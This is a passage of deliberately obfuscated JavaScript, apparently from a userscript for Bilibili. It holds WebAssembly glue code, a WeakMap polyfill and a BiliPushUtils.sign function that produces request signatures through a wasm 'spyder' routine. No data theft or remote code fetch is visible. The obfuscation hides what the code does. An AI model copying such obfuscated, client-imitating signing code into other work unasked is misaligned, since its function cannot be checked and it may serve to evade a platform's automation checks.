_0x2858fd['\x71\x6e\x58\x4a\x57'](_0x26df76[0x0],_0x545cf2);});return~_0x26df76&&this['\x61'][_0x52b8('38e','\x45\x31\x29\x5e')](_0x26df76,0x1),!!~_0x26df76;}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x62\x30\x35\x66\x35\x33\x31\x38\x39\x64\x61\x63\x63\x63\x66\x32\x64\x33\x36\x35\x61\x64\x32\x36\x64\x61\x61\x34\x30\x37\x64\x34\x66\x37\x61\x62\x65\x61\x39':function(_0x4bdd4c,_0x58c2e1){_0x58c2e1=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('38f','\x33\x77\x24\x77')](_0x58c2e1),_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('390','\x5e\x41\x36\x4b')](_0x4bdd4c,_0x58c2e1[_0x52b8('391','\x56\x74\x75\x5b')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x30\x36\x64\x64\x65\x34\x61\x63\x66\x30\x39\x34\x33\x33\x62\x35\x31\x39\x30\x61\x34\x62\x30\x30\x31\x32\x35\x39\x66\x65\x35\x64\x34\x61\x62\x63\x62\x63\x32':function(_0x4bdd4c,_0x58c2e1){if(_0x629afb[_0x52b8('392','\x54\x29\x5b\x45')](_0x629afb[_0x52b8('393','\x47\x38\x41\x23')],_0x629afb['\x6a\x74\x63\x49\x52'])){if(CONFIG['\x44\x44\x5f\x42\x50']&&BiliPush[_0x52b8('394','\x25\x28\x75\x71')]){return _0x545cf2[_0x52b8('395','\x5d\x47\x45\x51')]['\x73\x70\x79\x64\x65\x72'](_0x4bdd4c,_0x58c2e1);}return'';}else{_0x58c2e1=_0x545cf2[_0x52b8('396','\x67\x56\x57\x47')][_0x52b8('397','\x76\x46\x41\x68')](_0x58c2e1),_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('398','\x28\x25\x25\x25')](_0x4bdd4c,_0x58c2e1[_0x52b8('399','\x49\x43\x28\x41')]);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x33\x33\x61\x33\x39\x64\x65\x34\x63\x61\x39\x35\x34\x38\x38\x38\x65\x32\x36\x66\x65\x39\x63\x61\x61\x32\x37\x37\x31\x33\x38\x65\x38\x30\x38\x65\x65\x62\x61':function(_0x4bdd4c,_0x58c2e1){if(_0x629afb['\x44\x5a\x6d\x45\x53'](_0x629afb[_0x52b8('39a','\x70\x58\x38\x32')],_0x629afb[_0x52b8('39b','\x5d\x47\x45\x51')])){_0x58c2e1=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('346','\x5e\x41\x36\x4b')](_0x58c2e1),_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('390','\x5e\x41\x36\x4b')](_0x4bdd4c,_0x58c2e1[_0x52b8('39c','\x64\x5e\x23\x6e')]);}else{_0x58c2e1=_0x545cf2[_0x52b8('2c1','\x34\x6f\x33\x70')][_0x52b8('39d','\x42\x43\x4a\x50')](_0x58c2e1),_0x545cf2[_0x52b8('1c1','\x61\x44\x73\x29')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x4bdd4c,_0x58c2e1['\x6c\x65\x6e\x67\x74\x68']);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x63\x64\x66\x32\x38\x35\x39\x31\x35\x31\x37\x39\x31\x63\x65\x34\x63\x61\x64\x38\x30\x36\x38\x38\x62\x32\x30\x30\x35\x36\x34\x66\x62\x30\x38\x61\x38\x36\x31\x33':function(_0x4bdd4c,_0x58c2e1){var _0x13199d={'\x61\x51\x59\x45\x54':function(_0x1a02bf,_0x228a41,_0x2d0bfb){return _0x47ead8['\x56\x73\x6e\x78\x57'](_0x1a02bf,_0x228a41,_0x2d0bfb);}};_0x58c2e1=_0x545cf2[_0x52b8('189','\x28\x64\x70\x75')]['\x74\x6f\x5f\x6a\x73'](_0x58c2e1),_0x545cf2[_0x52b8('1ff','\x32\x4b\x4d\x68')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x4bdd4c,function(){var _0x44de6e={'\x4c\x64\x44\x62\x48':function(_0x59406e,_0x242aa1){return _0x629afb[_0x52b8('39e','\x5d\x47\x45\x51')](_0x59406e,_0x242aa1);}};if(_0x629afb['\x6e\x48\x6b\x70\x4d'](_0x629afb[_0x52b8('39f','\x76\x46\x41\x68')],_0x629afb[_0x52b8('3a0','\x55\x63\x50\x2a')])){try{if(_0x629afb[_0x52b8('3a1','\x54\x29\x5b\x45')](_0x629afb['\x4b\x46\x51\x63\x47'],_0x629afb['\x4b\x46\x51\x63\x47'])){return{'\x76\x61\x6c\x75\x65':_0x58c2e1[_0x52b8('3a2','\x55\x63\x50\x2a')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}else{var _0x209794=_0x13199d['\x61\x51\x59\x45\x54'](d,this,_0x545cf2);if(_0x209794)return _0x209794[0x1];}}catch(_0x19cf2d){if(_0x629afb[_0x52b8('3a3','\x76\x46\x41\x68')](_0x629afb[_0x52b8('3a4','\x2a\x38\x4d\x52')],_0x629afb['\x66\x76\x69\x4e\x4e'])){return{'\x65\x72\x72\x6f\x72':_0x19cf2d,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}else{_0x19cf2d[_0x52b8('3a5','\x54\x29\x5b\x45')]={'\x64\x65\x66\x61\x75\x6c\x74':_0x44de6e[_0x52b8('3a6','\x61\x44\x73\x29')](_0x58c2e1,0x381),'\x5f\x5f\x65\x73\x4d\x6f\x64\x75\x6c\x65':!0x0};}}}else{_0x545cf2[_0x52b8('200','\x64\x44\x63\x54')][_0x52b8('3a7','\x70\x77\x62\x54')](_0x4bdd4c);}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x38\x65\x66\x38\x37\x63\x34\x31\x64\x65\x64\x31\x63\x31\x30\x66\x38\x64\x65\x33\x63\x37\x30\x64\x65\x61\x33\x31\x61\x30\x35\x33\x65\x31\x39\x37\x34\x37\x63':function(_0x4bdd4c,_0x58c2e1){var _0x96ab8a={'\x6e\x50\x77\x70\x4b':function(_0x5a6291,_0xdd28c9,_0x11ec5a){return _0x47ead8[_0x52b8('3a8','\x5e\x41\x36\x4b')](_0x5a6291,_0xdd28c9,_0x11ec5a);},'\x6b\x44\x43\x4d\x4c':function(_0x47fa56,_0x56aa85){return _0x47ead8[_0x52b8('3a9','\x67\x26\x4d\x4e')](_0x47fa56,_0x56aa85);},'\x53\x65\x52\x78\x4c':function(_0x3ccfbb,_0x155240){return _0x47ead8[_0x52b8('3aa','\x75\x40\x21\x64')](_0x3ccfbb,_0x155240);},'\x42\x6b\x77\x6c\x62':function(_0x507efa,_0x4e801f){return _0x47ead8['\x56\x65\x59\x70\x48'](_0x507efa,_0x4e801f);},'\x76\x6b\x41\x72\x42':_0x47ead8[_0x52b8('3ab','\x62\x62\x29\x6a')],'\x61\x68\x6a\x61\x6a':function(_0x287d32,_0x31a7c7){return _0x47ead8['\x64\x47\x6b\x51\x4b'](_0x287d32,_0x31a7c7);},'\x72\x53\x6e\x7a\x50':_0x47ead8[_0x52b8('3ac','\x25\x28\x75\x71')],'\x45\x50\x66\x68\x59':function(_0x264496,_0x13f496){return _0x47ead8['\x56\x65\x59\x70\x48'](_0x264496,_0x13f496);},'\x57\x61\x50\x45\x6f':function(_0x4eaf82,_0x269c85){return _0x47ead8['\x78\x51\x4e\x74\x46'](_0x4eaf82,_0x269c85);},'\x53\x66\x44\x6e\x6a':function(_0x18f129,_0x33b954){return _0x47ead8['\x6d\x6d\x4b\x68\x59'](_0x18f129,_0x33b954);},'\x42\x57\x67\x67\x4c':function(_0x1e43f4,_0xcb0457){return _0x47ead8[_0x52b8('3ad','\x70\x58\x38\x32')](_0x1e43f4,_0xcb0457);},'\x45\x4f\x58\x47\x52':function(_0x4cd136,_0x1ed62a){return _0x47ead8[_0x52b8('3ae','\x64\x5e\x23\x6e')](_0x4cd136,_0x1ed62a);},'\x41\x70\x6b\x56\x46':function(_0xc0d403,_0x2ed584){return _0x47ead8[_0x52b8('3af','\x55\x4e\x45\x6d')](_0xc0d403,_0x2ed584);},'\x63\x4c\x4c\x74\x63':function(_0x5dc311,_0x1d0e4c){return _0x47ead8['\x68\x58\x6f\x49\x55'](_0x5dc311,_0x1d0e4c);},'\x67\x58\x61\x43\x53':function(_0x22b5e7,_0x133b5b){return _0x47ead8[_0x52b8('3b0','\x66\x47\x4f\x5b')](_0x22b5e7,_0x133b5b);},'\x5a\x6f\x78\x57\x4b':function(_0x2ebbd5,_0x19428a){return _0x47ead8['\x79\x71\x6b\x6e\x6e'](_0x2ebbd5,_0x19428a);},'\x61\x43\x4a\x5a\x57':function(_0xb03e8b,_0x2933c2){return _0x47ead8[_0x52b8('3b1','\x76\x46\x41\x68')](_0xb03e8b,_0x2933c2);},'\x45\x73\x46\x42\x6f':_0x47ead8[_0x52b8('3b2','\x31\x31\x78\x6c')],'\x6f\x66\x59\x72\x5a':function(_0x933b0b,_0xcfb969){return _0x47ead8[_0x52b8('3b3','\x64\x5e\x23\x6e')](_0x933b0b,_0xcfb969);},'\x5a\x78\x6f\x4a\x46':function(_0x57d7b7,_0x179387){return _0x47ead8['\x6d\x6d\x4b\x68\x59'](_0x57d7b7,_0x179387);},'\x6c\x6d\x49\x71\x6f':_0x47ead8['\x49\x58\x4b\x43\x57'],'\x7a\x77\x4b\x7a\x42':function(_0x2e33e0,_0x75a3d1){return _0x47ead8[_0x52b8('3b4','\x65\x34\x59\x79')](_0x2e33e0,_0x75a3d1);},'\x5a\x67\x4e\x4c\x6f':_0x47ead8[_0x52b8('3b5','\x32\x4b\x4d\x68')]};_0x58c2e1=_0x545cf2[_0x52b8('223','\x58\x24\x25\x73')][_0x52b8('39d','\x42\x43\x4a\x50')](_0x58c2e1),_0x545cf2[_0x52b8('1c1','\x61\x44\x73\x29')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x4bdd4c,function(){try{if(_0x96ab8a[_0x52b8('3b6','\x33\x77\x24\x77')](_0x96ab8a[_0x52b8('3b7','\x33\x77\x24\x77')],_0x96ab8a['\x6c\x6d\x49\x71\x6f'])){return{'\x76\x61\x6c\x75\x65':_0x58c2e1[_0x52b8('3b8','\x56\x74\x75\x5b')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}else{var _0x51b337=_0x96ab8a[_0x52b8('3b9','\x31\x31\x78\x6c')](_0x2d88a9,_0x96ab8a['\x6b\x44\x43\x4d\x4c'](_0x260a4a,_0x4bdd4c),!0x0);return _0x96ab8a[_0x52b8('3ba','\x42\x79\x6b\x23')](!0x0,_0x51b337)?_0x96ab8a[_0x52b8('3bb','\x70\x66\x40\x6e')](_0x52fdea,_0x545cf2)[_0x52b8('3bc','\x29\x7a\x73\x5b')](_0x4bdd4c,_0x58c2e1):_0x51b337[_0x545cf2['\x5f\x69']]=_0x58c2e1,_0x545cf2;}}catch(_0x3bf0b8){if(_0x96ab8a[_0x52b8('3bd','\x55\x63\x50\x2a')](_0x96ab8a['\x5a\x67\x4e\x4c\x6f'],_0x96ab8a[_0x52b8('3be','\x5d\x63\x5a\x66')])){var _0x1d8d3d=Object[_0x52b8('3bf','\x40\x25\x53\x76')][_0x52b8('3c0','\x49\x43\x28\x41')]['\x63\x61\x6c\x6c'](_0x58c2e1);if(_0x96ab8a[_0x52b8('3c1','\x58\x24\x25\x73')](_0x96ab8a[_0x52b8('3c2','\x21\x50\x6b\x42')],_0x1d8d3d))_0x3bf0b8[_0x52b8('3c3','\x75\x40\x21\x64')][_0x96ab8a['\x61\x68\x6a\x61\x6a'](_0x4bdd4c,0xc)]=0x4,_0x3bf0b8['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('3c4','\x28\x25\x25\x25')](_0x4bdd4c,_0x58c2e1);else if(_0x96ab8a[_0x52b8('3c5','\x25\x28\x75\x71')](_0x96ab8a[_0x52b8('3c6','\x6b\x6f\x29\x50')],_0x1d8d3d))_0x96ab8a['\x45\x50\x66\x68\x59'](_0x58c2e1,_0x96ab8a[_0x52b8('3c7','\x76\x46\x41\x68')](0x0,_0x58c2e1))?(_0x3bf0b8[_0x52b8('3c8','\x55\x71\x73\x58')][_0x96ab8a[_0x52b8('3c9','\x59\x73\x7a\x26')](_0x4bdd4c,0xc)]=0x2,_0x3bf0b8[_0x52b8('3ca','\x70\x66\x40\x6e')][_0x96ab8a[_0x52b8('3cb','\x55\x71\x73\x58')](_0x4bdd4c,0x4)]=_0x58c2e1):(_0x3bf0b8[_0x52b8('3c3','\x75\x40\x21\x64')][_0x96ab8a['\x42\x57\x67\x67\x4c'](_0x4bdd4c,0xc)]=0x3,_0x3bf0b8['\x48\x45\x41\x50\x46\x36\x34'][_0x96ab8a['\x53\x66\x44\x6e\x6a'](_0x4bdd4c,0x8)]=_0x58c2e1);else if(_0x96ab8a[_0x52b8('3cc','\x58\x24\x25\x73')](null,_0x58c2e1))_0x3bf0b8[_0x52b8('279','\x6b\x6f\x29\x50')][_0x96ab8a[_0x52b8('3cd','\x67\x56\x57\x47')](_0x4bdd4c,0xc)]=0x1;else if(_0x96ab8a['\x45\x4f\x58\x47\x52'](void 0x0,_0x58c2e1))_0x3bf0b8[_0x52b8('3ce','\x47\x38\x41\x23')][_0x96ab8a[_0x52b8('3cf','\x42\x43\x4a\x50')](_0x4bdd4c,0xc)]=0x0;else if(_0x96ab8a[_0x52b8('3d0','\x6b\x6f\x29\x50')](!0x1,_0x58c2e1))_0x3bf0b8['\x48\x45\x41\x50\x55\x38'][_0x96ab8a[_0x52b8('3d1','\x71\x41\x46\x73')](_0x4bdd4c,0xc)]=0x5;else if(_0x96ab8a['\x67\x58\x61\x43\x53'](!0x0,_0x58c2e1))_0x3bf0b8[_0x52b8('3d2','\x38\x30\x74\x63')][_0x96ab8a['\x5a\x6f\x78\x57\x4b'](_0x4bdd4c,0xc)]=0x6;else if(_0x96ab8a['\x61\x43\x4a\x5a\x57'](_0x96ab8a['\x45\x73\x46\x42\x6f'],_0x1d8d3d)){var _0x25a352=_0x3bf0b8['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0x58c2e1);_0x3bf0b8['\x48\x45\x41\x50\x55\x38'][_0x96ab8a[_0x52b8('3d3','\x45\x31\x29\x5e')](_0x4bdd4c,0xc)]=0xf,_0x3bf0b8[_0x52b8('3d4','\x73\x56\x6a\x39')][_0x96ab8a[_0x52b8('3d5','\x51\x5b\x73\x47')](_0x4bdd4c,0x4)]=_0x25a352;}else{var _0x46bc3c=_0x3bf0b8[_0x52b8('93','\x54\x29\x5b\x45')][_0x52b8('3d6','\x31\x31\x78\x6c')](_0x58c2e1);_0x3bf0b8[_0x52b8('3c8','\x55\x71\x73\x58')][_0x96ab8a[_0x52b8('3d7','\x75\x40\x21\x64')](_0x4bdd4c,0xc)]=0x9,_0x3bf0b8['\x48\x45\x41\x50\x33\x32'][_0x96ab8a[_0x52b8('3d8','\x67\x56\x57\x47')](_0x4bdd4c,0x4)]=_0x46bc3c;}}else{return{'\x65\x72\x72\x6f\x72':_0x3bf0b8,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x39\x36\x33\x38\x64\x36\x34\x30\x35\x61\x62\x36\x35\x66\x37\x38\x64\x61\x66\x34\x61\x35\x61\x66\x39\x63\x39\x64\x65\x31\x34\x65\x63\x66\x31\x65\x32\x65\x63':function(_0x4bdd4c){_0x4bdd4c=_0x545cf2[_0x52b8('2ef','\x70\x58\x38\x32')][_0x52b8('373','\x75\x40\x21\x64')](_0x4bdd4c),_0x545cf2[_0x52b8('2ef','\x70\x58\x38\x32')]['\x75\x6e\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0x4bdd4c);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x66\x66\x35\x31\x30\x33\x65\x36\x63\x63\x31\x37\x39\x64\x31\x33\x62\x34\x63\x37\x61\x37\x38\x35\x62\x64\x63\x65\x32\x37\x30\x38\x66\x64\x35\x35\x39\x66\x63\x30':function(_0x4bdd4c){_0x545cf2[_0x52b8('3d9','\x25\x28\x75\x71')][_0x52b8('3da','\x54\x29\x5b\x45')]=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('3db','\x28\x25\x25\x25')](_0x4bdd4c);},'\x5f\x5f\x77\x65\x62\x5f\x6f\x6e\x5f\x67\x72\x6f\x77':_0x52fdea}},'\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65':function(_0x4bdd4c){return Object[_0x52b8('3dc','\x38\x30\x74\x63')](_0x545cf2,_0x47ead8['\x75\x68\x74\x4a\x75'],{'\x76\x61\x6c\x75\x65':_0x4bdd4c}),Object[_0x52b8('3dd','\x64\x44\x63\x54')](_0x545cf2,_0x47ead8[_0x52b8('3de','\x31\x31\x78\x6c')],{'\x76\x61\x6c\x75\x65':_0x545cf2[_0x52b8('3df','\x67\x56\x57\x47')][_0x52b8('3e0','\x38\x50\x71\x53')][_0x52b8('3e1','\x33\x77\x24\x77')]}),Object[_0x52b8('3e2','\x51\x5b\x73\x47')](_0x545cf2,_0x47ead8[_0x52b8('3e3','\x70\x58\x38\x32')],{'\x76\x61\x6c\x75\x65':_0x545cf2[_0x52b8('3e4','\x31\x31\x78\x6c')][_0x52b8('3e5','\x55\x63\x50\x2a')][_0x52b8('3e6','\x76\x46\x41\x68')]}),Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x545cf2,_0x47ead8[_0x52b8('3e7','\x6b\x6f\x29\x50')],{'\x76\x61\x6c\x75\x65':_0x545cf2[_0x52b8('3e8','\x25\x28\x75\x71')][_0x52b8('3e9','\x75\x40\x21\x64')][_0x52b8('3ea','\x75\x40\x21\x64')]}),_0x545cf2['\x65\x78\x70\x6f\x72\x74\x73'][_0x52b8('3eb','\x70\x59\x54\x65')]=function(_0x4bdd4c,_0x58c2e1){return _0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('3ec','\x40\x25\x53\x76')](_0x545cf2[_0x52b8('3ed','\x2a\x47\x64\x5e')]['\x65\x78\x70\x6f\x72\x74\x73']['\x73\x70\x79\x64\x65\x72'](_0x545cf2[_0x52b8('3ee','\x29\x7a\x73\x5b')]['\x70\x72\x65\x70\x61\x72\x65\x5f\x61\x6e\x79\x5f\x61\x72\x67'](_0x4bdd4c),_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('3ef','\x67\x56\x57\x47')](_0x58c2e1)));},_0x47ead8['\x50\x78\x6d\x77\x64'](_0x52fdea),BiliPushUtils['\x73\x69\x67\x6e']=function(_0x4bdd4c,_0x58c2e1){if(CONFIG[_0x52b8('3f0','\x5e\x41\x36\x4b')]&&BiliPush[_0x52b8('3f1','\x42\x79\x6b\x23')]){return _0x545cf2[_0x52b8('3f2','\x64\x44\x63\x54')][_0x52b8('3f3','\x55\x4e\x45\x6d')](_0x4bdd4c,_0x58c2e1);}return'';},_0x545cf2[_0x52b8('e5','\x29\x7a\x73\x5b')];}};};},893:function(_0x3344b0,_0x45cbec,_0x40eeaa){var _0x435b82={'\x56\x68\x5a\x6f\x74':function(_0x46dde7,_0x19a220){return _0x46dde7(_0x19a220);},'\x51\x66\x65\x6c\x6b':'\x57\x65\x61\x6b\x4d\x61\x70'};_0x435b82[_0x52b8('3f4','\x75\x40\x21\x64')](_0x40eeaa,0x1f4)(_0x435b82[_0x52b8('3f5','\x42\x79\x6b\x23')]);},894:function(_0x1307fa,_0x24920c,_0x3330da){var _0x2dbca4={'\x79\x52\x54\x74\x49':function(_0x36993d,_0x24620f){return _0x36993d(_0x24620f);},'\x74\x72\x4f\x64\x4c':_0x52b8('3f6','\x56\x24\x55\x57')};_0x2dbca4[_0x52b8('3f7','\x61\x44\x73\x29')](_0x3330da,0x1f5)(_0x2dbca4['\x74\x72\x4f\x64\x4c']);},895:function(_0x2aa728,_0x2cc028,_0x5dc11c){var _0x15157b={'\x42\x75\x55\x52\x66':function(_0x59027a,_0x49c6d0){return _0x59027a===_0x49c6d0;},'\x44\x4d\x66\x46\x67':function(_0x48ae67,_0x3543de){return _0x48ae67!==_0x3543de;},'\x42\x73\x71\x74\x6c':'\x46\x55\x43\x41\x4f','\x6c\x43\x73\x56\x68':_0x52b8('3f8','\x21\x50\x6b\x42'),'\x6d\x4e\x62\x54\x77':function(_0x7b3111,_0x17a3b3){return _0x7b3111===_0x17a3b3;},'\x75\x70\x61\x75\x4e':_0x52b8('3f9','\x42\x43\x4a\x50'),'\x67\x7a\x58\x66\x6f':'\x65\x70\x44\x76\x61','\x53\x4d\x67\x58\x51':function(_0x111c60,_0x4724fc,_0x4ae15){return _0x111c60(_0x4724fc,_0x4ae15);},'\x48\x76\x63\x6d\x7a':function(_0x370d59,_0x4341fc){return _0x370d59!==_0x4341fc;},'\x52\x47\x6f\x57\x7a':_0x52b8('3fa','\x64\x44\x63\x54'),'\x6f\x46\x45\x61\x44':_0x52b8('3fb','\x54\x29\x5b\x45'),'\x73\x54\x51\x77\x6f':function(_0x1a78dc,_0x121b6a){return _0x1a78dc===_0x121b6a;},'\x58\x4e\x4d\x6b\x78':_0x52b8('3fc','\x38\x30\x74\x63'),'\x72\x49\x4a\x72\x4a':_0x52b8('3fd','\x52\x6e\x61\x4a'),'\x64\x6c\x41\x56\x6c':function(_0x476de8,_0x1a048b,_0x1f795f){return _0x476de8(_0x1a048b,_0x1f795f);},'\x68\x4a\x76\x41\x57':function(_0x10a39d,_0x372e5d){return _0x10a39d/_0x372e5d;},'\x54\x55\x62\x66\x6f':function(_0x1beda5,_0x3bde57){return _0x1beda5+_0x3bde57;},'\x42\x73\x4d\x73\x41':function(_0x2a1c25,_0x1b4f6a,_0x5084c5,_0x2cfe1d,_0x227152){return _0x2a1c25(_0x1b4f6a,_0x5084c5,_0x2cfe1d,_0x227152);},'\x67\x68\x4f\x74\x56':function(_0x58057f,_0x155027){return _0x58057f!=_0x155027;},'\x43\x49\x6d\x4f\x65':function(_0x9f636c,_0x36244e){return _0x9f636c(_0x36244e);},'\x58\x53\x50\x4e\x49':function(_0x347301,_0x120655,_0x1d603e){return _0x347301(_0x120655,_0x1d603e);},'\x4e\x4a\x6a\x61\x52':'\x75\x79\x7a\x67\x70','\x5a\x65\x7a\x66\x6d':_0x52b8('3fe','\x42\x43\x4a\x50'),'\x56\x69\x78\x45\x50':function(_0x72f7a5,_0x5cf489){return _0x72f7a5(_0x5cf489);},'\x57\x61\x6d\x73\x71':function(_0x1c7395,_0x47dc3b){return _0x1c7395===_0x47dc3b;},'\x4e\x57\x4b\x77\x49':function(_0x3decf5,_0x4a1345){return _0x3decf5(_0x4a1345);},'\x43\x48\x53\x78\x75':function(_0x45ffa5,_0xaf6c0b,_0x3cdbf3){return _0x45ffa5(_0xaf6c0b,_0x3cdbf3);},'\x63\x65\x4c\x70\x6e':function(_0x2f3c2b,_0x478c5e,_0x3a4e71){return _0x2f3c2b(_0x478c5e,_0x3a4e71);},'\x4a\x77\x51\x59\x78':function(_0x17c983,_0x1b9a3c){return _0x17c983+_0x1b9a3c;},'\x58\x72\x73\x53\x52':function(_0x5eff23,_0x142e9c){return _0x5eff23/_0x142e9c;},'\x59\x57\x4b\x6e\x52':_0x52b8('3ff','\x51\x5b\x73\x47'),'\x57\x79\x58\x44\x67':function(_0x2c1e7c,_0x512afc){return _0x2c1e7c(_0x512afc);},'\x67\x64\x5a\x56\x4b':function(_0x4bc933,_0x3493ce,_0xde07d2){return _0x4bc933(_0x3493ce,_0xde07d2);},'\x65\x47\x46\x4a\x6e':function(_0x3af94c,_0x4a2c9a){return _0x3af94c(_0x4a2c9a);},'\x6c\x6a\x63\x53\x6a':function(_0x35f203,_0x59e526){return _0x35f203(_0x59e526);},'\x66\x6c\x64\x4a\x6e':function(_0x11eec6,_0x39915b){return _0x11eec6(_0x39915b);},'\x4a\x44\x4b\x6b\x76':function(_0x4c9994,_0x2614ac){return _0x4c9994(_0x2614ac);},'\x66\x47\x4d\x59\x4f':function(_0x145405,_0x29242a){return _0x145405(_0x29242a);},'\x64\x69\x6e\x44\x70':function(_0x1060d6,_0x14eb35){return _0x1060d6(_0x14eb35);},'\x69\x67\x72\x69\x7a':function(_0x5cc000,_0x4d72a0){return _0x5cc000(_0x4d72a0);},'\x76\x6a\x67\x79\x6e':function(_0x4ee29e,_0x85a8ed){return _0x4ee29e(_0x85a8ed);},'\x67\x7a\x5a\x79\x62':function(_0x585396,_0x585982){return _0x585396(_0x585982);},'\x68\x53\x71\x54\x78':function(_0x34f22f,_0x18e148){return _0x34f22f(_0x18e148);},'\x4a\x78\x6f\x73\x77':function(_0x5f2d2b,_0x2c31b2){return _0x5f2d2b(_0x2c31b2);}};'use strict';var _0x36da4d=_0x15157b[_0x52b8('400','\x73\x56\x6a\x39')](_0x5dc11c,0xb7),_0x578125=_0x15157b['\x4a\x44\x4b\x6b\x76'](_0x5dc11c,0xb4)['\x67\x65\x74\x57\x65\x61\x6b'],_0x5bd09b=_0x15157b[_0x52b8('401','\x2a\x47\x64\x5e')](_0x5dc11c,0x14),_0x1d0c29=_0x15157b[_0x52b8('402','\x28\x25\x25\x25')](_0x5dc11c,0x1f),_0x30d37f=_0x15157b[_0x52b8('403','\x75\x40\x21\x64')](_0x5dc11c,0xb8),_0x325adf=_0x15157b[_0x52b8('404','\x70\x77\x62\x54')](_0x5dc11c,0xb5),_0x49ab58=_0x15157b[_0x52b8('405','\x51\x5b\x73\x47')](_0x5dc11c,0x1dd),_0x1a05ba=_0x15157b['\x67\x7a\x5a\x79\x62'](_0x5dc11c,0x20),_0x317dc6=_0x15157b[_0x52b8('406','\x38\x30\x74\x63')](_0x5dc11c,0x19b),_0x2d8d19=_0x15157b[_0x52b8('407','\x70\x66\x40\x6e')](_0x49ab58,0x5),_0x15c5b0=_0x15157b['\x4a\x78\x6f\x73\x77'](_0x49ab58,0x6),_0x5c4361=0x0,_0x3b94e8=function(_0x2aa728){if(_0x15157b['\x44\x4d\x66\x46\x67'](_0x15157b[_0x52b8('408','\x34\x6f\x33\x70')],_0x15157b[_0x52b8('409','\x56\x24\x55\x57')])){return _0x2aa728['\x5f\x6c']||(_0x2aa728['\x5f\x6c']=new _0x2a596d());}else{return _0x15157b['\x42\x75\x55\x52\x66'](_0x2aa728[0x0],_0x2cc028);}},_0x2a596d=function(){if(_0x15157b[_0x52b8('40a','\x51\x5b\x73\x47')](_0x15157b[_0x52b8('40b','\x70\x58\x38\x32')],_0x15157b[_0x52b8('40c','\x45\x31\x29\x5e')])){_0x5dc11c=_0x2aa728[_0x52b8('1f4','\x5d\x47\x45\x51')][_0x52b8('40d','\x66\x47\x4f\x5b')](_0x5dc11c),_0x2aa728['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x2cc028,_0x5dc11c[_0x52b8('40e','\x42\x79\x6b\x23')]);}else{this['\x61']=[];}},_0x1b28f6=function(_0x2aa728,_0x2cc028){return _0x15157b[_0x52b8('40f','\x71\x41\x46\x73')](_0x2d8d19,_0x2aa728['\x61'],function(_0x2aa728){return _0x15157b[_0x52b8('410','\x28\x64\x70\x75')](_0x2aa728[0x0],_0x2cc028);});};_0x2a596d[_0x52b8('411','\x64\x44\x63\x54')]={'\x67\x65\x74':function(_0x2aa728){var _0x2cc028=_0x15157b[_0x52b8('412','\x70\x66\x40\x6e')](_0x1b28f6,this,_0x2aa728);if(_0x2cc028)return _0x2cc028[0x1];},'\x68\x61\x73':function(_0x2aa728){return!!_0x15157b[_0x52b8('413','\x46\x4b\x78\x79')](_0x1b28f6,this,_0x2aa728);},'\x73\x65\x74':function(_0x2aa728,_0x2cc028){if(_0x15157b['\x48\x76\x63\x6d\x7a'](_0x15157b[_0x52b8('414','\x38\x30\x74\x63')],_0x15157b[_0x52b8('415','\x21\x50\x6b\x42')])){var _0x5dc11c=_0x15157b[_0x52b8('416','\x56\x24\x55\x57')](_0x1b28f6,this,_0x2aa728);_0x5dc11c?_0x5dc11c[0x1]=_0x2cc028:this['\x61']['\x70\x75\x73\x68']([_0x2aa728,_0x2cc028]);}else{return _0x2aa728['\x77\x65\x62\x5f\x74\x61\x62\x6c\x65'][_0x52b8('417','\x65\x34\x59\x79')](_0x5dc11c)[_0x52b8('418','\x64\x44\x63\x54')](null,_0x36da4d);}},'\x64\x65\x6c\x65\x74\x65':function(_0x2aa728){var 